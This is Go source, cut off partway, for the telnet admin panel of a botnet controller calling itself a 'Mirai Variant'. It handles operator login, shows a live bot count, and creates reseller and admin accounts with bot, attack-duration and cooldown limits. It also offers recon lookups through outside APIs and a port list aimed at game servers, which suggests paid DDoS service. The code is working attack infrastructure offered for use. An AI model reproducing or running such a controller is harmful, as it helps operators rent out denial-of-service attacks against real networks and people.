package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mUsername\x1b[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mPassword\x1b[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;37mAuthing you into the \x1b[38;5;196mMirai Variant ;) \x1b[0;37m... \x1b[38;5;196m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))	


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;37mIncorrect credentials\r\n"))
        this.conn.Write([]byte("\r\x1b[0;37mPress any key to exit\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
	
	this.conn.Write([]byte("\r\n"))	
	this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
	this.conn.Write([]byte("\r\n\033[0m"))       
    this.conn.Write([]byte("\r\x1b[38;5;196m       		      ███╗   ███╗██╗██████╗  █████╗ ██╗\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ████╗ ████║██║██╔══██╗██╔══██╗██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██╔████╔██║██║██████╔╝███████║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██║╚██╔╝██║██║██╔══██╗██╔══██║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██║ ╚═╝ ██║██║██║  ██║██║  ██║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝\r\n"))
	this.conn.Write([]byte("\r\x1b[38;5;196m                                                 \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         v1.0\r\n"))
    this.conn.Write([]byte("\r\x1b[90m     █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\r\n"))
	this.conn.Write([]byte("\r\x1b[90m     █-------------------ᴛʏᴘᴇ ʜᴇʟᴘ ғᴏʀ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ---------------------█\r\n"))
	this.conn.Write([]byte("\r\x1b[90m     █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))                                                                      
    this.conn.Write([]byte("\r\x1b[90m	                                                                       \r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))
	
    go func() {
        i := 0
        for {
		    var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
			
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Mirai Variant BotCount | Username: [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[38;5;196m" + username + "\x1b[0;37m@\x1b[38;5;196mMirai\x1b[0;37m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
		    this.conn.Write([]byte("\r\n"))
		    this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[90mAuthed Into Mirai Variant!!\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
            this.conn.Write([]byte("\r\n"))	
	        this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
	        this.conn.Write([]byte("\r\n\033[0m"))       
    this.conn.Write([]byte("\r\x1b[38;5;196m       		      ███╗   ███╗██╗██████╗  █████╗ ██╗\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ████╗ ████║██║██╔══██╗██╔══██╗██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██╔████╔██║██║██████╔╝███████║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██║╚██╔╝██║██║██╔══██╗██╔══██║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ██║ ╚═╝ ██║██║██║  ██║██║  ██║██║\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m                      ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝\r\n"))
	this.conn.Write([]byte("\r\x1b[38;5;196m                                                 \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         v1.0\r\n"))
    this.conn.Write([]byte("\r\x1b[90m     █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\r\n"))
	this.conn.Write([]byte("\r\x1b[90m     █-------------------ᴛʏᴘᴇ ʜᴇʟᴘ ғᴏʀ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ---------------------█\r\n"))
	this.conn.Write([]byte("\r\x1b[90m     █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))
    this.conn.Write([]byte("\r\x1b[90m                                                                         \r\n"))                                                                      
    this.conn.Write([]byte("\r\x1b[90m	                                                                       \r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
 
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m Enter New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m Enter Max Bot Count (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m \x1b[0;37m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m \x1b[0;37m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m \x1b[0;37m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[0;37m-\x1b[0;31m>\x1b[0;37m User Added Successfully.\033[0m\r\n"))
            }
            continue
			
		}
		
		
		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "/h" {

			this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))		 
			this.conn.Write([]byte("\r\x1b[38;5;196m            ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴍɪʀᴀɪ ᴠᴀʀɪᴀɴᴛ ᴇɴᴊᴏʏ ʏᴏᴜʀ ᴛɪᴍᴇ ʜᴇʀᴇ\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █         -SUPPORT-           █   █   Admin/Reseller Options   █\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █          -Owner-            █████  .Addrich  / To Add Admin  █\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █       Mirai Variant         █   █  .Remove / To Remove User  █\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █ Discord Mirai Variant#3188  █   █  adduser / To Add New User █\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █    Instagram mirai_variant  █████    FOR ADMIN USE ONLYY     █\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\r\n"))
            this.conn.Write([]byte("\r\x1b[38;5;196m     █                    █              █               █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  ▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █        -Tool Commands-            █  -Simple User Commands-  █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Ping / Pings An IP                █      ? / For Methods     █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Iplookup / Lookup An IP           █  Ports / For Most Ports  █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Portscan / Portscans An IP        █  cls / To Clear Screen   █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Whois / Whois Search An IP        █  exit / To Log Out       █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Traceroute / Traceroute On An IP  █  bots / To Show Bots     █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Resolve / Resolves A Website      █                          █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Reversedns / Finds DNS Of A IP    █       -#1 Rule-          █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Asnlookup /  Finds ASN Of A Ip    █    NO SHARING LOGINS OR  █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Subnetcalc / Calculates A Subnet  █    =INSTANT BAN WITH     █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █.Zonetransfer / Shows ZoneTrans    █     NO REFUND            █\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;196m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\r\n"))
            continue
        }

        if err != nil || cmd == ".Iplookup" || cmd == ".iplookup" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == ".Portscan" || cmd == ".portscan" {                  
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[0m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Whois" || cmd == ".whois" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Ping" || cmd == ".ping" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == ".Traceroute" || cmd == ".traceroute" {                  
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[0m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == ".Resolve" || cmd == ".resolve" {                  
            this.conn.Write([]byte("\x1b[1;33mWebsite (Without www.)\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[0m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Reversedns" || cmd == ".reversedns" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Asnlookup" || cmd == ".asnlookup" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Subnetcalc" || cmd == ".subnetcalc" {
            this.conn.Write([]byte("\x1b[1;33mIP Address\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == ".Zonetransfer" || cmd == ".zonetransfer" {
            this.conn.Write([]byte("\x1b[1;33mIP Address Or Website (Without www.)\x1b[0m: \x1b[1;33m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;33mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;33m: \r\n\x1b[1;33m" + locformatted + "\r\n"))
		
		}
		
		if err != nil || cmd == "Ports" || cmd == "PORTS" || cmd == "/p" {
		this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
        this.conn.Write([]byte("\r\n\033[0m"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █0-ip 1-ICMP 17-UDP 19-CHARGEN 20/21-FTP 22-SSH 23-TELNET     █\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █25-SMTP 37-TIME 45-WHOIS 53-DNS 58-ICMP6 67/68-DHCP 69-TFTP  █\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █101-HOSTNAME 109-POP2 110-POP3 115-SFTP 119-NNTP 123-NTP     █\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █135-RPC 137/128/139-NetBIOS 143-IMAP 161/162-SNMP 179-BGP    █\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █194-irc 389-LDAPS 443-HTTPS/OPENVPN 513-WHO 514-CMD 520-RIP  █\r\n"))  
        this.conn.Write([]byte("\r\x1b[38;5;196m  █636-LDAPS 989/990-FTP over TLS/SSL 1024-NFOS 1194-OPENVPN UDP█\r\n"))     
        this.conn.Write([]byte("\r\x1b[38;5;196m  █3074 FOR BO2 3076 USE IF 3074 IS BLOCKED 3658-GTA V PORT     █\r\n"))
        this.conn.Write([]byte("\r\x1b[38;5;196m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\r\n"))
		this.conn.Write([]byte("\r\n\033[0m"))
		    continue
				
        }
		
		if userInfo.admin == 1 && cmd == ".Remove" {
            this.conn.Write([]byte("\033[1;33mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;33mAre You Sure You Want To Remove \033[1;33m" + rm_un + "?\033[1;33m(\033[01;32my\033[1;33m/\033[01;31mn\033[1;33m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;33mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;33mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
	    if userInfo.admin == 1 && cmd == ".Addrich" {
            this.conn.Write([]byte("\033[0mUsername:\033[1;33m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[1;33m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[1;33m(\033[0m-1 for access to all\033[1;33m)\033[0m:\033[1;33m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[1;33m(\033[0m-1 for none\033[1;33m)\033[0m:\033[1;33m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[1;33m(\033[0m0 for none\033[1;33m)\033[0m:\033[1;33m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[1;33m" + new_un + "\r\n\033[0m- Password - \033[1;33m" + new_pw + "\r\n\033[0m- Bots - \033[1;33m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;33m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;33m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;33m(\033[01;32my\033[1;33m/\033[01;31mn\033[1;33m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;33mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
		
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
